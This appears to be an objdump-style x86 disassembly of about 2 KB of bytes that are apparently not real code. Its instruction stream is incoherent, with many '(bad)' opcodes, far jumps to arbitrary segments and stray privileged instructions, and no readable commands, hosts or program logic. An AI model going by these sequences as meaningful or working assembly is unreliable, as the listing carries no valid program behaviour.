  41c7b0:	push   ds
  41c7b1:	and    al,0xfe
  41c7b3:	sub    ecx,DWORD PTR [ecx+0x5f]
  41c7b6:	cld    
  41c7b7:	push   esp
  41c7b8:	adc    eax,0x12059d7c
  41c7bd:	sub    eax,DWORD PTR [edx]
  41c7bf:	sub    al,0xe2
  41c7c1:	ficomp DWORD PTR [ebp+0x131fbea4]
  41c7c7:	pop    esi
  41c7c8:	and    al,cl
  41c7ca:	and    eax,0x68ae1688
  41c7cf:	cmp    eax,0x2b13cef7
  41c7d4:	inc    esp
  41c7d5:	xlat   BYTE PTR ds:[ebx]
  41c7d6:	sbb    edx,DWORD PTR [ecx-0x66610ea6]
  41c7dc:	xchg   ch,dl
  41c7de:	pusha  
  41c7df:	cld    
  41c7e0:	pushf  
  41c7e1:	push   eax
  41c7e2:	mov    edx,0xff8e27d
  41c7e7:	xor    DWORD PTR [edx-0x2cec0724],0x79759f11
  41c7f1:	mov    bl,0x71
  41c7f3:	mov    ebx,0x16859aad
  41c7f8:	xchg   ebx,eax
  41c7f9:	dec    edi
  41c7fa:	cs ret 
  41c7fc:	mul    DWORD PTR [bx+si]
  41c7ff:	std    
  41c800:	push   ecx
  41c801:	int3   
  41c802:	sti    
  41c803:	ss xor al,0x2a
  41c806:	add    BYTE PTR [edx],al
  41c808:	pop    edx
  41c809:	jle    0x41c7ff
  41c80b:	or     al,0xa5
  41c80d:	jl     0x41c7f3
  41c80f:	lods   eax,DWORD PTR ds:[esi]
  41c810:	sub    edx,ebp
  41c812:	jmp    0xe693:0x7394fc63
  41c819:	sbb    al,0xc2
  41c81b:	pop    edx
  41c81c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c81d:	mov    ds:0xaca5e5c1,al
  41c822:	mov    esi,0x84383b84
  41c827:	jnp    0x41c864
  41c829:	into   
  41c82a:	push   ecx
  41c82b:	add    al,0x34
  41c82d:	int    0x54
  41c82f:	and    eax,0x1af90fdf
  41c834:	dec    edi
  41c835:	addr16 cwde 
  41c837:	(bad)  
  41c839:	fidivr WORD PTR [ebp+0xf326fe7]
  41c83f:	or     eax,0x467a3a5f
  41c844:	repz idiv BYTE PTR [eax+0x4c]
  41c848:	and    cl,BYTE PTR [ebp-0x25]
  41c84b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c84c:	sub    DWORD PTR [ebx-0x2d6dc7df],ecx
  41c852:	mov    al,ds:0x5be19c39
  41c857:	sub    DWORD PTR [esi-0x13],eax
  41c85a:	stos   BYTE PTR es:[edi],al
  41c85b:	lock cwde 
  41c85d:	push   0x30dc77e2
  41c862:	cmp    esp,DWORD PTR [esi+0x16]
  41c865:	dec    ebx
  41c866:	hlt    
  41c867:	and    dl,bh
  41c869:	test   DWORD PTR [edx-0x36],0x1a1f046b
  41c870:	mov    esp,0x3f376773
  41c875:	mov    ebp,0x15c5fda9
  41c87a:	(bad)  
  41c87b:	ror    DWORD PTR [edi+edi*4-0x1a],cl
  41c87f:	push   eax
  41c880:	cmp    al,0xdc
  41c882:	gs cmp dl,dl
  41c885:	stc    
  41c886:	je     0x41c853
  41c888:	nop
  41c889:	mov    WORD PTR [ebx],?
  41c88b:	cmc    
  41c88c:	jmp    0x29f3a160
  41c891:	lock out 0xcd,al
  41c894:	xchg   esi,eax
  41c895:	xchg   eax,ebp
  41c897:	xchg   ebx,eax
  41c898:	and    BYTE PTR [edx-0x17],bh
  41c89b:	in     eax,dx
  41c89c:	out    dx,al
  41c89d:	rcl    DWORD PTR [edx-0x2d],0x94
  41c8a1:	stc    
  41c8a2:	fwait
  41c8a3:	dec    esp
  41c8a4:	fist   WORD PTR ds:0x4b36ac
  41c8aa:	(bad)  
  41c8ab:	(bad)  
  41c8ac:	stos   DWORD PTR es:[edi],eax
  41c8ad:	lea    ebx,[esi]
  41c8af:	test   eax,0xab1a95c0
  41c8b4:	pop    es
  41c8b5:	cmp    dl,BYTE PTR [esi+0x8]
  41c8b8:	cmp    DWORD PTR [edi-0x70],ebx
  41c8bb:	xor    ah,dl
  41c8bd:	test   al,0x13
  41c8bf:	fnstenv [ecx]
  41c8c1:	cmp    DWORD PTR [eax+edi*4+0x57],ebp
  41c8c5:	inc    ecx
  41c8c6:	push   ss
  41c8c7:	sti    
  41c8c8:	mov    eax,0x6769ba8c
  41c8cd:	mov    bl,0x2e
  41c8cf:	and    eax,0x270f9819
  41c8d4:	popa   
  41c8d5:	sbb    bh,BYTE PTR [eax]
  41c8d7:	fsub   st(5),st
  41c8d9:	mov    ah,BYTE PTR [eax+0x6a]
  41c8dc:	jmp    0x97d:0xee1f2df2
  41c8e3:	push   es
  41c8e4:	daa    
  41c8e5:	jns    0x41c880
  41c8e7:	jge    0x41c8c0
  41c8e9:	xchg   ebx,edi
  41c8eb:	inc    ebx
  41c8ec:	adc    bh,BYTE PTR [ecx]
  41c8ee:	dec    ecx
  41c8ef:	icebp  
  41c8f0:	sbb    eax,0xac996eda
  41c8f5:	ret    0x8ec2
  41c8f8:	and    eax,0x83aa2cfd
  41c8fd:	push   0x6d49ffc4
  41c902:	inc    ebx
  41c903:	leave  
  41c904:	push   0xffffffc6
  41c906:	push   ebx
  41c907:	ret    0xe2d0
  41c90a:	push   ss
  41c90b:	pushf  
  41c90c:	cmc    
  41c90d:	xor    eax,0xaba0d4b0
  41c912:	ins    BYTE PTR es:[edi],dx
  41c913:	inc    ecx
  41c914:	scas   eax,DWORD PTR es:[edi]
  41c915:	scas   al,BYTE PTR es:[edi]
  41c916:	lods   eax,DWORD PTR ds:[esi]
  41c917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c918:	cmp    cl,bh
  41c91a:	(bad)  
  41c91b:	mov    edi,0x55a42d81
  41c920:	jb     0x41c99f
  41c922:	sbb    DWORD PTR [esi-0x3c771738],ecx
  41c928:	(bad)  
  41c929:	ret    
  41c92a:	repnz hlt 
  41c92c:	jo     0x41c8e5
  41c92e:	jmp    0x145c:0xd58d986b
  41c935:	pop    ss
  41c936:	arpl   WORD PTR [ecx],sp
  41c938:	sub    eax,0x56a7bb42
  41c93d:	out    0xeb,eax
  41c93f:	outs   dx,DWORD PTR ds:[esi]
  41c940:	ins    DWORD PTR es:[edi],dx
  41c941:	ins    DWORD PTR es:[edi],dx
  41c942:	test   eax,0x3b539ec6
  41c947:	inc    edx
  41c948:	inc    ecx
  41c949:	mov    cl,0xe8
  41c94b:	in     al,dx
  41c94c:	shl    bl,0x9a
  41c94f:	lahf   
  41c950:	push   eax
  41c951:	mov    ebx,0x654534ec
  41c956:	push   ebx
  41c957:	pusha  
  41c958:	mov    eax,ds:0xcdbb83b5
  41c95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c95e:	cld    
  41c95f:	sub    eax,0x3dfc079d
  41c964:	jle    0x41c9ca
  41c966:	sti    
  41c967:	pop    ss
  41c968:	pop    ebp
  41c969:	adc    al,0xba
  41c96b:	(bad)  
  41c96c:	mov    ebx,0x1cad938b
  41c971:	push   0x30b20407
  41c976:	aam    0x35
  41c978:	fld    QWORD PTR [ecx]
  41c97a:	xor    BYTE PTR [ebp+0x3468a1d5],0x26
  41c981:	jns    0x41c91a
  41c983:	idiv   ah
  41c985:	cmp    ah,0xab
  41c988:	neg    BYTE PTR [ecx+0xc0b2917]
  41c98e:	push   ss
  41c98f:	mov    edi,0x84771943
  41c994:	sub    al,0xb0
  41c996:	xor    dh,BYTE PTR [ebx]
  41c998:	icebp  
  41c999:	inc    ecx
  41c99a:	test   eax,esp
  41c99c:	cdq    
  41c99d:	inc    esp
  41c99e:	jmp    0x41c941
  41c9a0:	push   ebx
  41c9a1:	cmp    BYTE PTR [edi+0x63],dh
  41c9a4:	out    dx,eax
  41c9a5:	dec    ebp
  41c9a6:	dec    edi
  41c9a7:	push   ebx
  41c9a8:	mov    ebx,0x97df1016
  41c9ad:	sub    DWORD PTR [ecx-0x6f],ebp
  41c9b0:	mov    ebx,0xb7e1f26d
  41c9b5:	cs sub al,0x74
  41c9b8:	add    edi,0x3d08e5f
  41c9be:	mov    dh,0x42
  41c9c0:	cmp    eax,0xb8f805e0
  41c9c5:	rol    ecx,cl
  41c9c7:	fisub  WORD PTR [ecx+0x4c71e347]
  41c9cd:	lock cmp eax,0x26250ca
  41c9d3:	push   ebp
  41c9d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9d5:	mov    esp,0xb35b2473
  41c9da:	jbe    0x41c9f3
  41c9dc:	sbb    esi,DWORD PTR [ecx-0x56a53e5d]
  41c9e2:	mov    esp,0x5e055b8b
  41c9e7:	test   edx,eax
  41c9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ea:	sbb    al,0x0
  41c9ec:	jb     0x41c9e5
  41c9ee:	loope  0x41ca4e
  41c9f0:	test   al,0x8d
  41c9f2:	mov    bl,0x85
  41c9f4:	add    ebp,DWORD PTR [edi+esi*8-0x2b3fbc24]
  41c9fb:	jns    0x41c9a5
  41c9fd:	jns    0x41c9d5
  41c9ff:	xchg   edx,eax
  41ca00:	call   0x638:0xc19a6e27
  41ca07:	sub    edx,DWORD PTR [edx-0x4d]
  41ca0a:	mov    eax,ds:0x80bdc086
  41ca0f:	arpl   WORD PTR [ecx],dx
  41ca11:	sbb    DWORD PTR [ebp-0x388f195a],ebp
  41ca17:	push   edi
  41ca18:	push   ds
  41ca19:	scas   eax,DWORD PTR es:[edi]
  41ca1a:	inc    esi
  41ca1b:	pop    edx
  41ca1c:	repnz cmp al,0x3f
  41ca1f:	pop    ds
  41ca20:	mov    ecx,0xe8ad7a57
  41ca25:	sub    esi,DWORD PTR [esi]
  41ca27:	(bad)  
  41ca29:	push   es
  41ca2a:	jle    0x41ca2a
  41ca2c:	cmp    BYTE PTR [ebp-0x51ec1b5],ch
  41ca32:	je     0x49de9a2b
  41ca38:	imul   ecx,DWORD PTR [ecx+0x136ec84e],0xadff4103
  41ca42:	pusha  
  41ca43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca44:	out    0xe9,al
  41ca46:	fwait
  41ca47:	cwde   
  41ca48:	cmp    BYTE PTR [ecx-0x50],al
  41ca4b:	mov    ds:0x8894b0f7,eax
  41ca50:	mov    esp,0x635c64b5
  41ca55:	lea    ebp,[edi+ecx*4]
  41ca58:	add    al,0xf2
  41ca5a:	lds    ebx,FWORD PTR [edi-0x60384c2f]
  41ca60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca61:	mov    bl,0xed
  41ca63:	jmp    ebp
  41ca65:	outs   dx,DWORD PTR ds:[esi]
  41ca66:	rol    DWORD PTR [esi+0x6e27c055],1
  41ca6c:	sahf   
  41ca6d:	lods   al,BYTE PTR ds:[esi]
  41ca6e:	or     eax,0xc1b91e8d
  41ca73:	pop    ebp
  41ca74:	icebp  
  41ca75:	sub    bl,BYTE PTR ds:0xc8549326
  41ca7b:	retf   
  41ca7c:	add    eax,0x7170a1f9
  41ca81:	mov    ch,0x5a
  41ca83:	aam    0x39
  41ca85:	inc    ebp
  41ca86:	dec    eax
  41ca87:	pop    ds
  41ca88:	(bad)  
  41ca89:	ja     0x41caa0
  41ca8b:	(bad)  
  41ca8c:	mov    ah,0xb8
  41ca8e:	ror    DWORD PTR [edi],cl
  41ca90:	not    DWORD PTR [ecx]
  41ca92:	in     eax,dx
  41ca93:	shr    DWORD PTR [edi+0x749b2201],1
  41ca99:	ds jmp 0x35de:0x37e10f8e
  41caa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caa2:	cmp    cl,BYTE PTR [ebp+0x7dbad0cc]
  41caa8:	adc    al,0x79
  41caaa:	call   0x97f3:0x10104821
  41cab1:	push   esp
  41cab2:	xchg   ebp,eax
  41cab3:	mov    bl,0x74
  41cab5:	jmp    0x4e52:0xb7661588
  41cabc:	out    dx,al
  41cabd:	jns    0x41cadd
  41cabf:	push   0xed4a1496
  41cac4:	inc    esi
  41cac5:	cmc    
  41cac6:	repz dec edx
  41cac8:	jl     0x41cb39
  41caca:	lods   al,BYTE PTR ds:[esi]
  41cacb:	and    ebp,ecx
  41cacd:	mov    BYTE PTR [esi-0x28],cl
  41cad0:	in     eax,0x2
  41cad2:	loop   0x41cac8
  41cad4:	xchg   edi,eax
  41cad5:	outs   dx,DWORD PTR ds:[esi]
  41cad6:	fstp   st(0)
  41cad8:	push   ebx
  41cad9:	jp     0x41ca7d
  41cadb:	addr16 jmp 0x41cb4a
  41cade:	adc    eax,0xa340bd5c
  41cae3:	xchg   BYTE PTR [edi-0x66263747],ah
  41cae9:	addr16 stc 
  41caeb:	clc    
  41caec:	xor    BYTE PTR cs:[edx-0x2854376d],cl
  41caf3:	(bad)  
  41caf4:	ret    
  41caf5:	je     0x41cae9
  41caf7:	push   esi
  41caf8:	push   edx
  41caf9:	inc    ebx
  41cafa:	jno    0x41caa0
  41cafc:	sbb    ah,ah
  41cafe:	imul   ecx,DWORD PTR [ecx+0x7f50022c],0xe5183ebf
  41cb08:	and    dh,BYTE PTR [esi+0x6bd74efc]
  41cb0e:	push   ecx
  41cb0f:	lods   eax,DWORD PTR ds:[esi]
  41cb10:	adc    eax,0x216ecd5e
  41cb15:	fmul   st,st(0)
  41cb17:	mov    ds:0x3dea9faf,al
  41cb1c:	leave  
  41cb1d:	push   eax
  41cb1e:	sti    
  41cb1f:	ja     0x41cb08
  41cb21:	add    DWORD PTR [edi+0x21],edi
  41cb24:	adc    dh,ah
  41cb26:	js     0x41cb5e
  41cb28:	ficomp WORD PTR [ecx+0x3397264c]
  41cb2e:	retf   
  41cb2f:	leave  
  41cb30:	not    ah
  41cb32:	fsubr  DWORD PTR [eax+0x160d9c2e]
  41cb38:	jnp    0x41cb0a
  41cb3a:	add    ah,BYTE PTR [ebx+0x402e33ba]
  41cb40:	adc    cl,BYTE PTR [edx-0xe]
  41cb43:	mov    WORD PTR [edx+0x5c],fs
  41cb46:	int3   
  41cb47:	push   ds
  41cb48:	push   cs
  41cb49:	sub    bh,bl
  41cb4b:	(bad)  
  41cb4c:	cmp    ah,BYTE PTR [edx-0xae096e9]
  41cb52:	or     ebp,DWORD PTR [ebp-0x316c308b]
  41cb58:	call   0xf807af9a
  41cb5d:	scas   eax,DWORD PTR es:[edi]
  41cb5e:	gs js  0x41cb4b
  41cb61:	mov    ch,0x1b
  41cb63:	test   DWORD PTR [ecx+0x64],ebp
  41cb66:	js     0x41cb3a
  41cb68:	test   BYTE PTR [ebx-0x54628935],cl
  41cb6e:	xor    eax,0xb2d697f5
  41cb73:	xchg   edi,eax
  41cb74:	jp     0x41cb6e
  41cb76:	clc    
  41cb77:	ja     0x41cb8c
  41cb79:	xchg   edx,eax
  41cb7a:	jmp    0x41cbb6
  41cb7c:	jp     0x41cb1a
  41cb7e:	xchg   edi,eax
  41cb7f:	and    DWORD PTR [ebx-0x4586173],ebp
  41cb85:	call   FWORD PTR [ebx+0xa2b2eb]
  41cb8b:	pop    ecx
  41cb8c:	test   DWORD PTR [esi+ebx*8+0x69],ecx
  41cb90:	mov    edx,0xe9e7c952
  41cb95:	stos   BYTE PTR es:[edi],al
  41cb96:	mov    WORD PTR [edx],cs
  41cb98:	xchg   ebp,eax
  41cb99:	ins    DWORD PTR es:[edi],dx
  41cb9a:	add    ebp,eax
  41cb9c:	push   0x1e54c76a
  41cba1:	rdtsc  
  41cba3:	add    al,0xaa
  41cba5:	inc    ecx
  41cba6:	clc    
  41cba7:	in     eax,dx
  41cba8:	ror    BYTE PTR [ecx+0x11],1
  41cbab:	into   
  41cbac:	dec    ebx
  41cbad:	fcom   QWORD PTR [eax+0x7b53900]
  41cbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbb4:	jl     0x41cbee
  41cbb6:	jmp    0x41cb7d
  41cbb8:	jp     0x41cb93
  41cbba:	call   0xcc3473a
  41cbbf:	fstp   QWORD PTR [ecx]
  41cbc1:	pop    esp
  41cbc2:	xchg   BYTE PTR [ebx-0x52a427c4],dl
  41cbc8:	fs popa 
  41cbca:	pop    ebp
  41cbcb:	ret    0x8b9f
  41cbce:	cmp    bp,bp
  41cbd1:	add    al,0xf9
  41cbd3:	call   0x4406ad95
  41cbd8:	mov    bh,0x6a
  41cbda:	fstp   QWORD PTR [ebp+0x5a]
  41cbdd:	xchg   DWORD PTR gs:[ecx-0x2],esp
  41cbe1:	adc    BYTE PTR [ecx+ebx*4+0x22],0x70
  41cbe6:	and    eax,0x24bbe1bf
  41cbeb:	or     edi,DWORD PTR [ecx+0x417e3d20]
  41cbf1:	cmp    edx,DWORD PTR [esi+0x1b]
  41cbf4:	imul   BYTE PTR [esi+edx*2+0x4b]
  41cbf8:	jo     0x41cc6c
  41cbfa:	mov    ebp,0xe26613bf
  41cbff:	jmp    0x45b1a8da
  41cc04:	out    dx,al
  41cc05:	mov    dl,0x54
  41cc07:	and    DWORD PTR [ebp+0x17],esi
  41cc0a:	xchg   ebx,eax
  41cc0b:	adc    bh,ch
  41cc0d:	add    DWORD PTR [ecx+edx*1-0x61],esp
  41cc11:	xchg   ebx,eax
  41cc12:	(bad)  
  41cc14:	test   BYTE PTR [edi+0x777877e6],ch
  41cc1a:	mov    ecx,0x833379e4
  41cc1f:	outs   dx,BYTE PTR ds:[esi]
  41cc20:	fwait
  41cc21:	fwait
  41cc22:	repz inc eax
  41cc24:	dec    eax
  41cc25:	setg   dl
  41cc28:	daa    
  41cc29:	idiv   BYTE PTR [edx-0x50a2dc17]
  41cc2f:	les    edi,FWORD PTR [edi+0x2329c87a]
  41cc35:	ja     0x41cc9e
  41cc37:	into   
  41cc38:	daa    
  41cc39:	mov    dh,0xa2
  41cc3b:	jecxz  0x41cc14
  41cc3d:	test   edi,esi
  41cc3f:	(bad)  
  41cc40:	jbe    0x41cc1b
  41cc42:	iret   
  41cc43:	pop    edx
  41cc44:	pop    ss
  41cc45:	scas   eax,DWORD PTR es:[edi]
  41cc46:	loopne 0x41cca6
  41cc48:	cmp    BYTE PTR [edi],al
  41cc4a:	dec    eax
  41cc4b:	pop    DWORD PTR [eax+0x444c904b]
  41cc51:	arpl   WORD PTR [esi+ecx*8+0x1],si
  41cc55:	out    0xe2,al
  41cc57:	inc    esi
  41cc58:	fsubp  st(5),st
  41cc5a:	cmp    eax,0xc8947e19
  41cc5f:	push   ds
  41cc60:	call   0xf12319b8
  41cc65:	jp     0x41cca5
  41cc67:	es pop esp
  41cc69:	sbb    DWORD PTR [ebx+0x5c5451e0],ecx
  41cc6f:	in     eax,0xf2
  41cc71:	out    dx,eax
  41cc72:	dec    eax
  41cc73:	hlt    
  41cc74:	hlt    
  41cc75:	pushf  
  41cc76:	out    dx,al
  41cc77:	xor    cl,al
  41cc79:	mov    ebx,0xed52cd58
  41cc7e:	pop    eax
  41cc7f:	(bad)  
  41cc80:	js     0x41cc75
  41cc82:	inc    eax
  41cc83:	aad    0x75
  41cc85:	jae    0x41ccab
  41cc87:	push   es
  41cc88:	dec    edx
  41cc89:	pushf  
  41cc8a:	add    eax,0xd370744e
  41cc8f:	xchg   BYTE PTR [eax-0x6aacb58f],bh
  41cc95:	bndstx [ebx-0x182f4668],bnd3
  41cc9c:	lahf   
  41cc9d:	sbb    DWORD PTR [eax+0x428dba16],ecx
  41cca3:	pop    es
  41cca4:	dec    esi
  41cca5:	mov    eax,0x9ec3ce36
  41ccaa:	push   ebp
  41ccab:	scas   eax,DWORD PTR es:[edi]
  41ccac:	addr16 cdq 
  41ccae:	call   0xf44fbff0
  41ccb3:	scas   al,BYTE PTR es:[edi]
  41ccb4:	push   0xffffff9f
  41ccb6:	xor    al,0xce
  41ccb8:	div    bh
  41ccba:	mov    ah,0x5e
  41ccbc:	xor    bh,BYTE PTR [ecx*4+0x203b146b]
  41ccc3:	rcl    DWORD PTR [edi],cl
  41ccc5:	test   DWORD PTR [ecx-0x1e],eax
  41ccc8:	inc    ecx
  41ccc9:	int3   
  41ccca:	stos   BYTE PTR es:[edi],al
  41cccb:	sahf   
  41cccc:	or     ah,BYTE PTR [edi-0xb]
  41cccf:	mov    eax,0xf85acc6
  41ccd4:	lss    ebp,FWORD PTR [eax]
  41ccd7:	mov    ds:0x18955697,eax
  41ccdc:	xor    al,0xb6
  41ccde:	mov    ebx,0x960ba70a
  41cce3:	push   ss
  41cce4:	add    eax,0xeafa9a80
  41cce9:	mov    edx,0xa05f8556
  41ccee:	daa    
  41ccef:	into   
  41ccf0:	leave  
  41ccf1:	push   ebp
  41ccf2:	jl     0x41ccca
  41ccf4:	sub    al,0x3a
  41ccf6:	adc    BYTE PTR [edx-0x6f216233],cl
  41ccfc:	dec    edi
  41ccfd:	mov    edx,0xa4011efd
  41cd02:	inc    esi
  41cd03:	xor    DWORD PTR [edi],0x4049b275
  41cd09:	lods   al,BYTE PTR ds:[esi]
  41cd0a:	add    eax,0x2b5cc013
  41cd0f:	jmp    0xa03150d5
  41cd14:	push   edi
  41cd15:	push   0xcb79591f
  41cd1a:	loopne 0x41cd58
  41cd1c:	jp     0x41ccfa
  41cd1e:	push   ds
  41cd1f:	sub    BYTE PTR [esi+0x385f54e0],0x65
  41cd26:	push   eax
  41cd27:	jg     0x41cd3d
  41cd29:	adc    esp,DWORD PTR [ebx-0x6a]
  41cd2c:	loop   0x41cd5d
  41cd2e:	push   ebx
  41cd2f:	pop    DWORD PTR [edi+eiz*1-0x4d]
  41cd33:	cmp    bl,ah
  41cd35:	sbb    al,0x27
  41cd37:	push   cs
  41cd38:	mov    al,BYTE PTR [esi+ecx*1]
  41cd3b:	add    eax,0xe33381b1
  41cd40:	mov    eax,ds:0x4d0fdfbc
  41cd45:	jmp    0x41ccc8
  41cd47:	mov    ebx,0x2691ac9b
  41cd4c:	jae    0x41cd03
  41cd4e:	pop    eax
  41cd4f:	and    BYTE PTR [edx-0x269e86c5],dl
  41cd55:	push   ds
  41cd56:	outs   dx,DWORD PTR ds:[esi]
  41cd57:	ror    BYTE PTR [edi],0x7d
  41cd5a:	xlat   BYTE PTR ds:[ebx]
  41cd5b:	test   al,0x98
  41cd5d:	mov    dh,0xa5
  41cd5f:	gs leave 
  41cd61:	adc    eax,0x851e35b0
  41cd66:	xchg   ecx,eax
  41cd67:	jo     0x41cdd0
  41cd69:	hlt    
  41cd6a:	jg     0x41cdb2
  41cd6c:	jo     0x41cd13
  41cd6e:	ficom  WORD PTR cs:[ebp-0x411965ba]
  41cd75:	and    DWORD PTR ss:[ebx+ecx*4],0xa3f8527f
  41cd7d:	imul   esp,DWORD PTR [edi-0xe],0x9d815199
  41cd84:	and    BYTE PTR [edx+0x6a62edb6],bh
  41cd8a:	pusha  
  41cd8b:	pop    ecx
  41cd8c:	push   ebx
  41cd8d:	in     al,dx
  41cd8e:	(bad)  
  41cd8f:	ja     0x41cdbc
  41cd91:	or     esp,edi
  41cd93:	jo     0x41cd6e
  41cd95:	call   0x3c697ba5
  41cd9a:	imul   edi,DWORD PTR [edi-0x7c],0x12
  41cd9e:	sti    
  41cd9f:	or     edx,0x2afa0186
  41cda5:	pushf  
  41cda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda7:	mov    dh,0x53
  41cda9:	add    DWORD PTR [edx+0x71],ebx
  41cdac:	mov    dl,0x6f
  41cdae:	push   esp
  41cdaf:	nop
  41cdb0:	in     al,dx
  41cdb1:	jge    0x41cde0
  41cdb3:	mov    dh,0x6f
  41cdb5:	fcmovb st,st(3)
  41cdb7:	mov    edi,0x29b71aa
  41cdbc:	inc    edx
  41cdbd:	out    dx,eax
  41cdbe:	fist   WORD PTR [esi+0x695e5d31]
  41cdc4:	adc    ebx,edx
  41cdc6:	loopne 0x41cd61
  41cdc8:	jl     0x41cdad
  41cdca:	cs xchg ebp,eax
  41cdcc:	loop   0x41cd95
  41cdce:	or     BYTE PTR [edx+0x20],dl
  41cdd1:	rol    eax,0x99
  41cdd4:	mov    esp,0xffb23285
  41cdd9:	add    eax,0x7f161321
  41cdde:	iret   
  41cddf:	sub    DWORD PTR [ecx-0x46],ebx
  41cde2:	xchg   esi,eax
  41cde3:	sbb    DWORD PTR [ebp-0x73],0xfffffff9
  41cde7:	dec    esp
  41cde8:	leave  
  41cde9:	mov    BYTE PTR [ebp+0x3d327516],dl
  41cdef:	test   DWORD PTR [ebx],ebp
  41cdf1:	push   esp
  41cdf2:	mov    esi,0x50828ae1
  41cdf7:	mov    esp,0xe60dfadb
  41cdfc:	leave  
  41cdfd:	fidiv  WORD PTR [ebp*1+0x1c2ea4e0]
  41ce04:	je     0x41ce1e
  41ce06:	jne    0x41ce66
  41ce08:	out    dx,al
  41ce09:	inc    ecx
  41ce0a:	mov    edx,0x69752a94
  41ce0f:	inc    edi
  41ce10:	dec    esp
  41ce11:	adc    BYTE PTR [edx+0x40],cl
  41ce14:	xchg   BYTE PTR [ebx],cl
  41ce16:	fcmovnbe st,st(7)
  41ce18:	icebp  
  41ce19:	pushf  
  41ce1a:	mov    ch,0x4d
  41ce1c:	ja     0x41ce5c
  41ce1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce1f:	imul   edx,ecx,0x40b5b6f0
  41ce25:	xchg   edx,eax
  41ce26:	sub    DWORD PTR [ecx],ecx
  41ce28:	jmp    0x41ce71
  41ce2a:	jecxz  0x41cdbe
  41ce2c:	mov    esi,0xfc2b6ac7
  41ce31:	jle    0x41ce2e
  41ce33:	icebp  
  41ce34:	adc    BYTE PTR [ebx-0x4f7f3236],ah
  41ce3a:	xor    al,0x57
  41ce3c:	xor    dh,0x41
  41ce3f:	icebp  
  41ce40:	imul   esp,DWORD PTR [edx+edx*8+0x5eea668b],0x4a
  41ce48:	inc    edx
  41ce49:	mov    bh,0x3c
  41ce4b:	arpl   WORD PTR [edi+0x6],ax
  41ce4e:	retf   0xa801
  41ce51:	test   DWORD PTR [ecx+0x2b],edi
  41ce54:	and    ch,al
  41ce56:	jbe    0x41ce29
  41ce58:	test   eax,0xd0452a4a
  41ce5d:	mov    eax,ss:0xf5a6aef3
  41ce63:	jp     0x41ceab
  41ce65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce66:	inc    edi
  41ce67:	aad    0xac
  41ce69:	retf   0xeb7c
  41ce6c:	out    dx,al
  41ce6d:	jnp    0x41cee8
  41ce6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce70:	push   cs
  41ce71:	sub    al,0x4c
  41ce73:	dec    eax
  41ce74:	or     cl,BYTE PTR [ebx]
  41ce76:	(bad)  
  41ce77:	outs   dx,DWORD PTR ds:[esi]
  41ce78:	(bad)  
  41ce79:	or     eax,0x36d249ab
  41ce7e:	and    eax,0x8ea101e
  41ce83:	daa    
  41ce84:	sbb    al,ah
  41ce86:	push   es
  41ce87:	std    
  41ce88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce89:	sub    BYTE PTR [eax+ecx*4-0x5b],bl
  41ce8d:	or     al,BYTE PTR [edi-0x6b]
  41ce90:	mov    eax,ds:0x3097cf28
  41ce95:	sub    ecx,ebp
  41ce97:	push   ebp
  41ce98:	(bad)  
  41ce99:	jg     0x41ce5c
  41ce9b:	popa   
  41ce9c:	push   ebp
  41ce9d:	push   esi
  41ce9e:	in     eax,dx
  41ce9f:	inc    edx
  41cea0:	in     al,0x29
  41cea2:	stc    
  41cea3:	(bad)  
  41cea4:	imul   edx,DWORD PTR ds:0xd2b3acc1,0xe3bc9178
  41ceae:	bt     DWORD PTR [ecx+0x14189022],edx
  41ceb5:	dec    esp
  41ceb6:	(bad)  
  41ceb7:	mov    ecx,0x78742eb9
  41cebc:	dec    ebx
  41cebd:	mov    DWORD PTR [edx-0x1f],esi
  41cec0:	(bad)  
  41cec1:	int    0xb4
  41cec3:	jbe    0x41cef4
  41cec5:	mov    al,ds:0x929deacc
  41ceca:	cdq    
  41cecb:	into   
  41cecc:	cmp    esp,edx
  41cece:	inc    ebp
  41cecf:	cmp    BYTE PTR [ebx+0x39],bl
  41ced2:	fs nop
  41ced4:	xchg   edi,eax
  41ced5:	add    al,0xe9
  41ced7:	repnz in eax,0xed
  41ceda:	(bad)  
  41cedb:	jmp    0x654c:0x4630e5b3
  41cee2:	jns    0x41cf5a
  41cee4:	fwait
  41cee5:	jle    0x41cec7
  41cee7:	mov    ah,dh
  41cee9:	sbb    al,0xd5
  41ceeb:	call   0x960472bc
  41cef0:	adc    ebp,DWORD PTR [edx+0x7]
  41cef3:	mov    bl,0xc5
  41cef5:	add    eax,DWORD PTR [edi-0x2ddb346b]
  41cefb:	pop    ebp
  41cefc:	rol    DWORD PTR [edx-0x10],1
  41ceff:	pop    WORD PTR [edi]
  41cf02:	dec    ebx
  41cf03:	add    eax,0xcaa7d086
  41cf08:	dec    ebx
  41cf09:	push   ds
  41cf0a:	pop    ss
  41cf0b:	cmc    
  41cf0c:	js     0x41ced4
  41cf0e:	sub    bl,BYTE PTR [ebp+0x17]
  41cf11:	cmp    bh,bl
  41cf13:	hlt    
  41cf14:	out    0xbf,al
  41cf16:	pop    edi
  41cf17:	pop    edx
  41cf18:	mov    al,0x9f
  41cf1a:	in     eax,dx
  41cf1b:	(bad)  
  41cf1c:	aad    0x8b
  41cf1e:	jl     0x41ceac
  41cf20:	lahf   
  41cf21:	call   0x26080879
  41cf26:	pop    ecx
  41cf27:	push   edx
  41cf28:	mov    eax,ds:0xbdc2a7ad
  41cf2e:	aaa    
  41cf2f:	int3   
  41cf30:	xor    al,0xa3
  41cf32:	and    ebp,DWORD PTR [ebp-0x5c]
  41cf35:	jne    0x41cf44
  41cf37:	and    eax,0x9a13a6dc
  41cf3c:	ins    DWORD PTR es:[edi],dx
  41cf3d:	mov    ebx,0xdec60a51
